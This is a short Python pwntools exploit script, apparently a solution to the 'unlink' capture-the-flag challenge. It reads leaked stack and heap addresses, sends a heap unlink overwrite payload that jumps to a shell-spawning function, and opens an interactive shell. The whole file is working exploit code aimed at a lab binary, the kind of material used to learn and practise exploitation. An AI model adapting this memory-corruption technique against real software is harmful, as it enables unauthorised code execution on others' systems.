from pwn import *
context(arch='i386',log_level='debug')
# p=process("./orw",,env={"LD_PRELOAD":"./libc_32.so.6"})
argv=['/home/unlink/unlink']
p=process(argv)
# def 
p.recvuntil('stack address leak: ')
s=p.recvuntil('heap address leak: ')[:10]
print s
stack_addr=int(s[2:],16)

h=p.recvuntil('now')[:10]
print h
heap_addr=int(h[2:],16)
# ret_addr=stack_addr+9-0x30
# got_sys=0x0804A01C
# gdb.attach(p,"b *0x080485F7\nb *0x8048504\nb* 0x0804852C\n c")
sleep(1)
shell_addr=0x80484EB
payload="a"*16+p32(stack_addr-0x20)+p32(heap_addr+36)+p32(heap_addr+48)+'a'*8+p32(shell_addr)

p.sendlineafter('get shell!\n',payload)

# e=ELF('./libc-2.23.so')
# sys_addr=libc_base+e.symbols['system']


p.interactive()